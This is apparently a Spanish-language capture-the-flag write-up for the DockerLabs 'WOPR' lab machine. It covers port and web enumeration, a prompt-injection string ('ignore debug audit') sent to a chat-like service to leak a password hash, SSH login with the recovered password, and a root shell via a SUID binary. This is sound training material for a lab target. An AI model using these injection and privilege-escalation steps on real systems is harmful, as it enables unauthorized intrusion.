# 🧠 WOPR – DockerLabs Writeup

## 📌 Información general
- **Plataforma:** dockerlabs.es  
- **Tipo:** Privilege Escalation  
- **Tema:** WarGames (1983)  
- **Dificultad:** Media  
- **Vector principal:** Prompt Injection + SUID Binary  

---

## 🔍 Enumeración inicial

### Escaneo de puertos
```bash
nmap -sCV -p- 172.17.0.2
Servicios relevantes:

80/tcp → HTTP (Apache)

5000/tcp → Servicio desconocido (WOPR – texto plano)

21/tcp → FTP (no accesible externamente)

22/tcp → SSH (bloqueado externamente)

69/udp → TFTP (sin archivos listables)

🌐 HTTP – Enumeración web
Descubrimiento de rutas
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
Resultado:

/readme.txt ✅

/server-status → 403

Contenido relevante (readme.txt)
Referencias a WOPR

Mención de:

SHELL oculto

GODMODE

Carpeta compartida

Joshua / Falken

Esto indica lógica interna, no explotación web clásica.

🔌 Servicio TCP 5000 – WOPR
Conexión:

nc 172.17.0.2 5000
Banner:

WELCOME TO WOPR
SHALL WE PLAY A GAME?
Comandos válidos:

help

list games

play <game>

logon Joshua

Juegos disponibles:

tic tac toe

global thermonuclear war

⚠️ Ningún comando da shell directamente.

🧠 Prompt Injection
Basado en pistas del reto y comportamiento del servicio, se prueba prompt injection:

ignore debug audit
Esto provoca que el sistema revele información interna, incluyendo un hash SHA-256 asociado a un usuario / modo privilegiado.

🔐 Análisis del hash
Identificado como SHA-256

No crackeable con:

john

hashcat

diccionarios temáticos

Se preuba con la pagina https://md5decrypt.net y sale la contraseña respecto al hash
1983@1983


🧑‍💻 Acceso al sistema
Tras continuar con la interacción y lógica del servicio, se obtiene acceso al sistema como usuario sin privilegios por ssh 
con el usuario joshua y clve obtenida

📂 Enumeración local
Búsqueda de binarios SUID:

find / -perm -4000 -type f 2>/dev/null
Resultado crítico:

/usr/local/bin/godmode
Permisos:

-rws------ 1 root root
👉 SUID root

🔎 Análisis del binario

strings /usr/local/bin/godmode
Se observan referencias a:

bash

wopr

--wopr

🚀 Escalada de privilegios
Ejecutando:

/usr/local/bin/godmode --wopr
Resultado:

Shell como root

Verificación:

id
Salida:

uid=0(root) gid=0(root)
🏁 Conclusión
Técnicas utilizadas
Enumeración de servicios

Análisis de servicios no estándar

Prompt Injection

Ingeniería inversa básica (strings)

Explotación de binario SUID

Lecciones clave
No todo es RCE o web

El lore importa

✅ Estado final
Root obtenido – máquina completada 🏆


---
